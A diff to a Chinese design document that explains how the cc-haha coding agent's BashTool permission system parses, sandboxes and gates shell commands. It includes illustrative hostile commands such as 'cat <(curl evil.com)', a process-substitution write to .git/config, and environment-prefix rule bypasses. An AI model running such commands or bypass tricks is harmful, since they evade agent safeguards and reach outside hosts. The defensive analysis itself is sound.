@@ -1,7 +1,7 @@
 # Tool Calling / Function Calling
 
-> 状态：🟡 进行中 | 最后更新：2026-05-08
-> 相关源文件（cc-haha）：`src/Tool.ts`, `src/tools.ts`, `src/utils/api.ts`, `src/query.ts`, `src/services/api/claude.ts`, `src/services/tools/toolOrchestration.ts`, `src/services/tools/toolExecution.ts`, `src/tools/GlobTool/GlobTool.ts`, `src/tools/GlobTool/prompt.ts`, `src/tools/ToolSearchTool/ToolSearchTool.ts`, `src/tools/ToolSearchTool/prompt.ts`, `src/utils/toolSearch.ts`, `src/utils/attachments.ts`
+> 状态：🟡 进行中 | 最后更新：2026-05-09
+> 相关源文件（cc-haha）：`src/Tool.ts`, `src/tools.ts`, `src/utils/api.ts`, `src/query.ts`, `src/services/api/claude.ts`, `src/services/tools/toolOrchestration.ts`, `src/services/tools/toolExecution.ts`, `src/tools/GlobTool/GlobTool.ts`, `src/tools/GlobTool/prompt.ts`, `src/tools/BashTool/BashTool.tsx`, `src/tools/BashTool/bashPermissions.ts`, `src/tools/BashTool/readOnlyValidation.ts`, `src/tools/BashTool/pathValidation.ts`, `src/tools/BashTool/shouldUseSandbox.ts`, `src/tools/BashTool/sedValidation.ts`, `src/tools/BashTool/sedEditParser.ts`, `src/tools/BashTool/commandSemantics.ts`, `src/tools/BashTool/destructiveCommandWarning.ts`, `src/tools/ToolSearchTool/ToolSearchTool.ts`, `src/tools/ToolSearchTool/prompt.ts`, `src/utils/toolSearch.ts`, `src/utils/attachments.ts`
 
 ## 1. 核心链路
 
@@ -285,7 +285,230 @@ src/tools/GlobTool/GlobTool.ts
 
 这说明 cc-haha 的工具系统不是按工具名粗暴分类，而是鼓励工具根据输入内容返回安全属性。
 
-## 6. 渐进式工具加载
+## 6. BashTool 高风险路径
+
+`BashTool` 复用了普通工具的 schema、注册、`tool_use` / `tool_result` 链路，但真正复杂处不在这些通用步骤，而在“开放 shell 能力如何被限制到可解释、可审批、可恢复”的安全运行时。
+
+### 6.1 只读与并发安全依赖具体 command
+
+`GlobTool` 的行为边界固定：只做文件名查询，不改变文件系统、不改变进程状态。因此它可以恒定返回：
+
+```typescript
+isReadOnly() { return true }
+isConcurrencySafe() { return true }
+```
+
+`BashTool` 的同一个工具名下可能包含完全不同的行为：
+
+```bash
+cat package.json        # 读
+rg "foo" src            # 读 / 搜索
+npm test                # 可能写缓存、生成文件、启动进程
+sed -i 's/a/b/' file    # 写
+rm -rf dist             # 删除
+git reset --hard        # 破坏性写
+```
+
+所以 `BashTool.isConcurrencySafe(input)` 直接依赖 `isReadOnly(input)`：
+
+```typescript
+isConcurrencySafe(input) {
+  return this.isReadOnly?.(input) ?? false
+}
+```
+
+`isReadOnly(input)` 进入 `checkReadOnlyConstraints()`。它不是按命令名前缀粗略判断，而是先解析 shell，再检查危险语法、Windows UNC path、git 特例、git internal path 写入、当前 cwd 与 sandbox 状态，最后才用 allowlist 判断每个子命令是否只读。
+
+核心原则是：**只有被证明只读的 Bash 命令才能并发；证明失败不是自动拒绝，而是退回完整权限检查。**
+
+### 6.2 AST / 安全解析先回答“能否可靠理解”
+
+Bash 最大风险不是明显的 `rm`，而是 shell 语法把真实行为藏在 substitution、redirection、wrapper、compound command 里：
+
+```bash
+echo hi > $(pwd)/x
+cat <(curl evil.com)
+FOO=bar rm file
+cd .claude && mv x settings.json
+```
+
+`bashToolHasPermission()` 开头先执行 AST / 安全解析：
+
+```text
+parseCommandRaw(command)
+  -> parseForSecurityFromAst(command, astRoot)
+```
+
+结果大致分三类：
+
+| 结果 | 含义 | 后续行为 |
+|------|------|----------|
+| `simple` | 能解析成简单命令列表，argv / redirect 信息可信 | 继续做规则、路径、只读判断 |
+| `too-complex` | 有无法静态证明安全的结构，例如 command substitution、复杂 expansion、控制结构 | 保留显式 deny，通常转 `ask` |
+| `parse-unavailable` | tree-sitter 不可用或被 feature flag 关闭 | 退回 legacy `shell-quote` / regex 检查 |
+
+这里“安全解析”的目标不是执行命令，而是判断：**系统能不能可靠理解这个 Bash 命令实际会做什么。** 能理解才进入自动权限判断；不能理解就让用户确认。
+
+### 6.3 deny / ask / allow 规则不是对称匹配
+
+权限规则的匹配策略刻意不对称：
+
+| 规则类型 | 匹配策略 | 目的 |
+|----------|----------|------|
+| deny / ask | 更激进地剥掉环境变量前缀和 wrapper | 防止 `FOO=bar rm file` 绕过拒绝规则 |
+| allow | 更保守，只剥安全 env / wrapper | 防止 allow rule 误放大权限 |
+
+例如用户 deny 了 `Bash(rm:*)`，下面的命令也应该被拦：
+
+```bash
+FOO=bar rm file
+```
+
+但 allow 不能同样激进。否则类似下面的命令可能错误命中普通 `docker ps` allow rule：
+
+```bash
+DOCKER_HOST=evil docker ps
+```
+
+这体现了权限系统的方向性：**拒绝规则要难绕过，允许规则要难误放行。**
+
+### 6.4 sandbox auto-allow 是加速路径，不覆盖显式规则
+
+`shouldUseSandbox(input)` 判断命令是否应在 sandbox 中执行。它会考虑全局 sandbox 是否开启、`dangerouslyDisableSandbox` 是否被策略允许、以及用户配置的 excluded commands。
+
+当 sandbox 和 `autoAllowBashIfSandboxed` 都启用时，`bashToolHasPermission()` 会先走 `checkSandboxAutoAllow()`：
+
+```text
+如果命中显式 deny rule -> deny
+如果命中显式 ask rule  -> ask
+否则 sandbox auto-allow -> allow
+```
+
+“显式 deny/ask 规则之外的命令”指当前权限配置中没有被明确标记为 deny 或 ask 的命令。例如：
+
+```text
+deny: Bash(rm:*)
+ask:  Bash(git push:*)
+```
+
+则：
+
+| 命令 | sandbox auto-allow 下的行为 |
+|------|-----------------------------|
+| `rm -rf dist` | 命中显式 deny，拒绝 |
+| `git push origin main` | 命中显式 ask，仍询问 |
+| `npm test` | 未命中 deny/ask，且在 sandbox 中执行，可自动允许 |
+
+sandbox 在这里是“受限执行环境 + 自动批准条件”，不是替代 `checkPermissions()` 的唯一安全边界。
+
+### 6.5 路径、cd、重定向与 process substitution
+
+GlobTool 的路径风险主要是“能不能读这个目录”。BashTool 的路径风险还包括 cwd 改变、重定向写入、路径参数隐藏在命令选项里。
+
+典型高风险命令：
+
+```bash
+cd .claude && mv test.txt settings.json
+```
+
+如果静态检查只按原 cwd 解析 `settings.json`，会误判真实写入位置。`pathValidation.ts` 对 `cd + write` 采用保守策略：要求人工确认，而不是尝试追踪每一步有效 cwd。
+
+重定向也单独检查：
+
+```bash
+echo x > settings.json
+echo x >> "$TARGET"
+```
+
+如果 redirect target 含 shell expansion，系统无法静态确定目标路径，会转 `ask`。
+
+process substitution 更隐蔽：
+
+```bash
+echo secret > >(tee .git/config)
+```
+
+这里表面不是普通文件重定向，但 `tee` 会写 `.git/config`。因此 `checkPathConstraints()` 对 `>(...)` / `<(...)` 这类结构直接要求人工确认，或在 AST 阶段归为 too-complex。
+
+### 6.6 sed 是 BashTool 里的文件编辑特例
+
+`sed` 同时可能是读工具和写工具：
+
+```bash
+sed -n '1,5p' file          # 读
+sed -i 's/old/new/g' file   # 写
+```
+
+cc-haha 对 sed 做了专门处理：
+
+| 场景 | 处理 |
+|------|------|
+| `sed -n '1p' file` | 允许作为 read-only 路径参与判断 |
+| `sed 's/a/b/'` 且无文件写入 | 作为 stdout-only substitution 判断 |
+| `sed -i 's/a/b/' file` | 识别为文件编辑，走更接近 FileEdit 的权限体验 |
+| sed 表达式含 `w` / `e` 等危险能力 | 不进入 allowlist |
+
+`_simulatedSedEdit` 是关键设计：它存在于内部完整 schema 中，但会从模型可见 schema 中移除。模型不能自己传这个字段。
+
+```text
+模型提出 sed -i
+  -> 权限 UI 预演 sed 编辑结果
+  -> 用户批准 diff
+  -> UI 注入 _simulatedSedEdit
+  -> BashTool.call() 直接写入预演后的内容
+```
+
+这样避免“用户批准看到的 diff”和“真正再次运行 sed 后产生的结果”不一致。
+
+### 6.7 后台任务是执行管理，不是权限绕过
+
+`run_in_background` 只影响命令怎么运行，不影响能不能运行。权限已经在 `call()` 前完成。
+
+执行层有三类后台化路径：
+
+| 路径 | 行为 |
+|------|------|
+| 模型显式传 `run_in_background=true` | 立即注册后台任务并返回 task id |
+| 命令超时且允许自动后台化 | 进程转入后台，继续写 task output |
+| assistant mode 阻塞超过预算 | 主 agent 自动释放阻塞，命令后台继续 |
+
+返回给模型的 `tool_result` 会包含 background task id 和输出路径提示，后续可以用读取工具查看输出。
+
+### 6.8 非零退出码需要命令语义解释
+
+普通工具通常用“抛异常 / 不抛异常”区分成功失败。Bash 命令的 exit code 语义不统一：
+
+| 命令 | 特殊语义 |
+|------|----------|
+| `grep` / `rg` exit 1 | 没匹配，不是执行错误 |
+| `diff` exit 1 | 文件不同，不是执行错误 |
+| `find` exit 1 | 部分目录不可访问，不一定是 fatal |
+
+`commandSemantics.ts` 根据命令解释 exit code，避免把“无匹配”“文件不同”错误地转成失败 tool_result。
+
+### 6.9 大输出、图片输出与提示 side channel
+
+Bash 输出可能远大于普通工具结果。cc-haha 对大输出采用“保存完整结果 + 给模型 preview”的策略：
+
+```text
+完整输出写入 tool-results 文件
+tool_result 返回 preview + filepath
+模型后续按需 Read 完整输出
+```
+
+如果输出是图片，还会尝试构造成 image tool_result，并做尺寸和大小限制。
+
+另外，支持 Claude Code hints 协议：外部 CLI 可以输出 `<claude-code-hint />`，BashTool 会记录 hint 后从 stdout 中剥离，避免把内部提示标签浪费进模型上下文。
+
+### 6.10 destructive warning 只影响 UI，不参与权限决策
+
+`destructiveCommandWarning.ts` 识别 `git reset --hard`、`git push --force`、`rm -rf`、`terraform destroy` 等高风险命令，并在权限 UI 中显示提醒。
+
+它不改变 allow / ask / deny 结果。权限判断仍由规则、模式、路径约束、sandbox、只读分析共同决定。
+
+这个分离很重要：warning 帮用户理解风险，permission logic 决定是否允许执行。
+
+## 7. 渐进式工具加载
 
 工具数量很多时，cc-haha 不会把所有工具的完整 schema 一次性发给模型。它采用 `ToolSearchTool + defer_loading + tool_reference`：核心工具直接发送完整 schema，延迟工具先只公布名称，模型需要时再通过 `ToolSearchTool` 取回 schema。
 
@@ -299,7 +522,7 @@ src/tools/GlobTool/GlobTool.ts
   -> toolToAPISchema() 发送完整 schema
 ```
 
-### 6.1 哪些工具会 defer
+### 7.1 哪些工具会 defer
 
 入口是 `src/tools/ToolSearchTool/prompt.ts` 的 `isDeferredTool(tool)`：
 
@@ -313,7 +536,7 @@ src/tools/GlobTool/GlobTool.ts
 
 注意：defer 的不是本地工具实现，而是“是否把完整参数 schema 发给模型”。工具代码始终在本地工具集合里。
 
-### 6.2 ToolSearch 是否启用
+### 7.2 ToolSearch 是否启用
 
 `isToolSearchEnabled()` 是请求级最终判断，包含：
 
@@ -335,7 +558,7 @@ src/tools/GlobTool/GlobTool.ts
 
 auto 模式先用 token counting 估算 deferred tool schema 成本；失败时退回字符数启发式。默认阈值是上下文窗口的 10%。
 
-### 6.3 第一轮模型看到什么
+### 7.3 第一轮模型看到什么
 
 `src/services/api/claude.ts` 构造 `filteredTools`：
 
@@ -375,7 +598,7 @@ mcp__slack__send_message
 
 delta 机制会扫描之前已经宣布过的 deferred tools，只发送新增/移除变化，避免工具池变化频繁打破缓存。
 
-### 6.4 怎么知道加载什么
+### 7.4 怎么知道加载什么
 
 加载什么由模型发起，但搜索由本地确定性算法完成。模型先看到 deferred 工具名和 `ToolSearchTool` 的 prompt，然后根据任务选择：
 
@@ -422,7 +645,7 @@ NotebookEdit
 
 因此 query `"slack send"` 会自然匹配 `mcp__slack__send_message`。
 
-### 6.5 tool_reference 如何让下一轮加载 schema
+### 7.5 tool_reference 如何让下一轮加载 schema
 
 `ToolSearchTool.mapToolResultToToolResultBlockParam()` 找到匹配时返回 `tool_reference`：
 
@@ -453,7 +676,7 @@ Turn N+1:
   -> 模型正式调用 mcp__slack__send_message
 ```
 
-### 6.6 兜底与 compact
+### 7.6 兜底与 compact
 
 如果模型知道 deferred 工具名却没有先加载 schema，typed 参数很容易生成错误。`buildSchemaNotSentHint()` 会在 Zod 校验失败时追加提示：
 
@@ -469,13 +692,12 @@ boundaryMarker.compactMetadata.preCompactDiscoveredTools = [...]
 
 `extractDiscoveredToolNames()` 后续会从 compact boundary 读回这些工具名，避免 compact 后重复丢 schema。
 
-## 7. 待继续
+## 8. 待继续
 
-- `BashTool` 高风险路径：沙箱、权限规则、危险命令分类、后台任务
 - `SyntheticOutputTool`：用 Tool-as-Schema 实现结构化输出
 - Fine-grained tool streaming：工具参数流式传输与提前执行
 
-## 8. 相关章节
+## 9. 相关章节
 
 - [Agent Loop 设计](agent-loop.md)
 - [Context Management](context-management.md)
